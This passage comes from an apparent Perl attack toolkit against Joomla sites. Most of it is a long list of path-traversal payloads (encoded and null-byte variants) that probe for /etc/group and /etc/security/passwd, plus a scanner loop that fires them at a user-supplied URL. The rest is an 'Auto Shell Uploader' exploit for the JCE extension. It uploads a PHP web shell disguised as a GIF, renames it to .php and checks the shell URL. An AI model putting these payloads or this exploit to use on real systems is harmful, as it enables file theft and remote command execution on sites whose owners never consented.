.%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup","%2Fetc%2Fgroup%00","..%2Fetc%2Fgroup%00","..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fgroup%00","%2F%2Fetc/group","....%2F%2Fetc/group","....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group","/etc/group%00","....%2F%2Fetc/group%00","....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/group%00","//etc/group","....//etc/group","....//....//etc/group","....//....//....//etc/group","....//....//....//....//etc/group","....//....//....//....//....//etc/group","....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//etc/group","....//....//....//....//....//....//....//....//....//....//etc/group","//etc/group%00","....//etc/group%00","....//....//etc/group%00","....//....//....//etc/group%00","....//....//....//....//etc/group%00","....//....//....//....//....//etc/group%00","....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//etc/group%00","....//....//....//....//....//....//....//....//....//....//etc/group%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/passwd","../etc/security/passwd","../../etc/security/passwd","../../../etc/security/passwd","../../../../etc/security/passwd","../../../../../etc/security/passwd","../../../../../../etc/security/passwd","../../../../../../../etc/security/passwd","../../../../../../../../etc/security/passwd","../../../../../../../../../etc/security/passwd","../../../../../../../../../../etc/security/passwd","/etc/security/passwd%00","../etc/security/passwd%00","../../etc/security/passwd%00","../../../etc/security/passwd%00","../../../../etc/security/passwd%00","../../../../../etc/security/passwd%00","../../../../../../etc/security/passwd%00","../../../../../../../etc/security/passwd%00","../../../../../../../../etc/security/passwd%00","../../../../../../../../../etc/security/passwd%00","../../../../../../../../../../etc/security/passwd%00","%2Fetc%2Fsecurity%2Fpasswd","..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd","%2Fetc%2Fsecurity%2Fpasswd%00","..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fpasswd%00","....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd","....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/passwd%00","....//etc/security/passwd","....//....//etc/security/passwd","....//....//....//etc/security/passwd","....//....//....//....//etc/security/passwd","....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//etc/security/passwd","....//....//....//....//....//....//....//....//....//....//etc/security/passwd","....//etc/security/passwd%00","....//....//etc/security/passwd%00","....//....//....//etc/security/passwd%00","....//....//....//....//etc/security/passwd%00","....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//etc/security/passwd%00","....//....//....//....//....//....//....//....//....//....//etc/security/passwd%00","/etc/security/group","../etc/security/group","../../etc/security/group","../../../etc/security/group","../../../../etc/security/group","../../../../../etc/security/group","../../../../../../etc/security/group","../../../../../../../etc/security/group","../../../../../../../../etc/security/group","../../../../../../../../../etc/security/group","../../../../../../../../../../etc/security/group","/etc/security/group%00","../etc/security/group%00","../../etc/security/group%00","../../../etc/security/group%00","../../../../etc/security/group%00","../../../../../etc/security/group%00","../../../../../../etc/security/group%00","../../../../../../../etc/security/group%00","../../../../../../../../etc/security/group%00","../../../../../../../../../etc/security/group%00","../../../../../../../../../../etc/security/group%00","%2Fetc%2Fsecurity%2Fgroup","..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup","%2Fetc%2Fsecurity%2Fgroup%00","..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fsecurity%2Fgroup%00","%2F%2Fetc/security/group","....%2F%2Fetc/security/group","....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group","%2F%2Fetc/security/group%00","....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc/security/group%00","//etc/security/group","....//etc/security/group","....//....//etc/security/group","....//....//....//etc/security/group","....//....//....//....//etc/security/group","....//....//....//....//....//etc/security/group","....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//etc/security/group","....//....//....//....//....//....//....//....//....//....//etc/security/group","//etc/security/group%00","....//etc/security/group%00","....//....//etc/security/group%00","....//....//....//etc/security/group%00","....//....//....//....//etc/security/group%00","....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//etc/security/group%00","....//....//....//....//....//....//....//....//....//....//etc/security/group%00");
 
print "\n\ Enter Target eg:http://www.site.com/index.php?option=com_jeauto&view=";
print "\n\ Target:";
$Target=<STDIN>;
chomp ($kkk);
 
 
foreach $LFI(@LFI){
my $URL = $kkk.$LFI;
my $Source = get $URL;
die "Can not get $URL" unless defined $URL;
if ($Source =~ m/root/i || m/usr/i || m/dev/i || m/:x:/i || m/var/i || m/bin/i) { $Message ="LFI Vulnerability FOUND";}
else { $Message = "NOT FOUND LFI Vulnerability";}
print "$URL     =>    $Message\n";
print "\n \n \n \n \t \t \t \t FINISH ";
open (TEXT, '>>LFI.txt');
print TEXT "\n$URL   =>   $Message \n\n";
close (TEXT);
print 'result in LFI.txt';
}
}
 
if($c eq '5')
{
system("title Joomla JCE vuln");
system("cls");
print color("green"), "\n\n\t.::. Exploit for JCE Joomla Extension (Auto Shell Uploader) V0.1 .::.\n\n";
print color("green"), "\t||||        edited by: Nadim Zobaer (nadimzobaer[@]gmail[dot]com)      ||||\n\n";
print color("green"), "Write your target (without http://) : ";
my $fuck = <>;
chomp $fuck;
$TARGET = $fuck;
$PORT   = "80";
$SCRIPT = "/index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20";
$SHELL  = "/images/stories/0day.php?cmd=";
$HTTP   = "http://";
 
$header1G = "GET $SCRIPT HTTP/1.1";
$header1H = "HEAD /images/stories/0day.php HTTP/1.1";
$header1P = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&method=form&cid=20&6bc427c8a7981f4fe1f5ac65c1246b5f=cf6dd3cf1923c950586d0dd595c8e20b HTTP/1.1";
$header1P2 = "POST /index.php?option=com_jce&task=plugin&plugin=imgmanager&file=imgmanager&version=1576&cid=20 HTTP/1.1";
$header2 = "Host: $TARGET";
$header3 = "User-Agent: BOT/0.1 (BOT for JCE)";
$header4 = "Content-Type: multipart/form-data; boundary=---------------------------41184676334";
$header5 = "Content-Length: 769";
$header6 = "-----------------------------41184676334";
$header7 = 'Content-Disposition: form-data; name="upload-dir"';
$header8 = '/';
$header9 = 'Content-Disposition: form-data; name="Filedata"; filename=""';
$header10 = 'Content-Type: application/octet-stream';
$header11 = 'Content-Disposition: form-data; name="upload-overwrite"';
$header12 = "0";
$header13 = 'Content-Disposition: form-data; name="Filedata"; filename="0day.gif"';
$header14 = 'Content-Type: image/gif';
$header15 = 'GIF89aG';
$header16 = "<? system($_GET['cmd']);exit; ?>";
$header17 = 'Content-Disposition: form-data; name="upload-name"';
$header18 = '0day';
$header19 = 'Content-Disposition: form-data; name="action"';
$header20 = 'upload';
$header21 = "-----------------------------41184676334--";
$header22 = 'X-Request: JSON';
$header23 = 'Content-Type: application/x-www-form-urlencoded; charset=utf-8';
$header25 = 'json={"fn":"folderRename","args":["/0day.gif","0day.php"]}';
$header24 = "Content-Length: ".length($header25)."";
 
############################################### Packet 1 --> Checking Exploitability #########################################################
print "\n[*] Checking Exploitability ...\n\n";
sleep 2;
$pageURL=$TARGET.$SCRIPT;
$simplePage=get($pageURL);
@arr = ("2.0.11</title","2.0.12</title","2.0.13</title","2.0.14</title","2.0.15</title","1.5.7.10</title","1.5.7.11</title","1.5.7.12</title","1.5.7.13</title","1.5.7.14</title");
while (($count!=10) && ($die != 1)) {
    foreach $arr(@arr){
        if ($simplePage =~ m/$arr/) {
            print "\n[*] Target patched.\n\n";
            $die = 1;
        } else {
            $count++;
                }
        }
    }
 if ($count==5) {print "[*] Target is exploitable.\n\n"};
############################################### Packet 2 --> Uploading shell as a gif file #########################################################
$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"$PORT")
|| die "Can't connect to $TARGET";
print "[*] Trying to upload 0day.gif ...\n\n";
print $remote "$header1P\n$header2\n$header3\n$header4\n$header5\n\n$header6\n$header7\n\n$header8\n$header6\n$header9\n$header10\n\n\n$header6\n$header11\n\n$header12\n$header6\n$header13\n$header14\n\n$header15\n$header16\n$header6\n$header17\n\n$header18\n$header6\n$header19\n\n$header20\n$header21\n\n";
sleep 2;
############################################### Packet 3 --> Change Extension from .gif to .php #########################################################
print "[*] Trying to change extension from .gif to .php ...\n\n";
$remote = IO::Socket::INET->new(Proto=>"tcp",PeerAddr=>"$TARGET" ,PeerPort=>"$PORT")
|| die "Can't connect to $TARGET";
print $remote "$header1P2\n$header2\n$header3\n$header23\n$header22\n$header24\n\n$header25\n\n";
############################################### Packet 4 --> Check for successfully uploaded #########################################################
$shellurl=$TARGET.$SHELL;
$output=get($shellurl);
while ($output = <$remote> ) {
if ($output =~ /200 OK/) {
print "[+] 0day.php was successfully uploaded\n\n";
print "[+] Path:".$TARGET.$SHELL."id\n";
}}
 
}
}